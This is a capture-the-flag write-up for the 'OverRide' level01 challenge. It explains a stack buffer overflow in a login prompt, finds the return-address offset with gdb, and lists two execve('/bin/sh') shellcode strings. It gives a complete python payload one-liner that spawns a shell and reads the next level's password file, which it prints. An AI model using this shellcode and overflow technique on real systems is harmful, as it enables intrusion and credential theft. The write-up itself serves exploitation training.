after checking the assembly, we find the expect username is dat_wil and password is admin, and when we try : 
```level01@OverRide:~$ ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password: 
admin
nope, incorrect password...
```
no matter what password, we type, we get "nope, incorrect password..."

we find that The first fgets() is used the global var[100], with lenght 100 but in the case of the second fgets(), we can see that it uses a local stack buffer and that its size parameter is 100 which is bigger than the available space in the stack frame(96). it's a buffer overflow vulnerability, allowing an attacker to overwrite the saved EIP and redirect execution to injected shellcode. 
also it disable NX, means NX (No-eXecute) is a security feature that marks certain memory regions (like the stack or heap) as non-executable. so it does not prevent it, we can exploit that.

+-----------------+ <- High memory address (e.g., 0xfffffff0)
| Return Address  | (Saved %eip, overwritten during overflow)
+-----------------+
| Saved %ebp      | (Base pointer of the previous stack frame)
+-----------------+
| password_buffer | <- Starts at `0x1c(%esp)` (28 bytes offset from %esp)
|                 |    (Overflow starts here)
|                 |
| Local Variables | (96 bytes allocated for local variables)
+-----------------+ <- Low memory address (e.g., 0xffffffa0)

1. find the offset by pattern generator
```(gdb) run
Starting program: /home/users/level01/level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password: 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
```
'6aC7'
offset 80 bytes

so we can do
1. username (dat_wil + shellcode) is stored in the global buffer.
2. The password input overflows the local stack buffer and overwrites the saved return address (EIP) with the address of the shellcode.
3. When the function returns, execution jumps to the shellcode(global buffer+ 7), spawning a shell.

Shellcode (21 bytes):
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
https://www.exploit-db.com/exploits/41757
\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
https://shell-storm.org/shellcode/files/shellcode-752.html
- execve("/bin/sh", NULL, NULL);

```level01@OverRide:~$ python -c "print 'dat_wil' + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + '\n' + 'A' * 80 + '\x47\xa0\x04\x08'" > /tmp/level01
level01@OverRide:~$ cat /tmp/level01 - | ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

cat /home/users/level02/.pass            
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```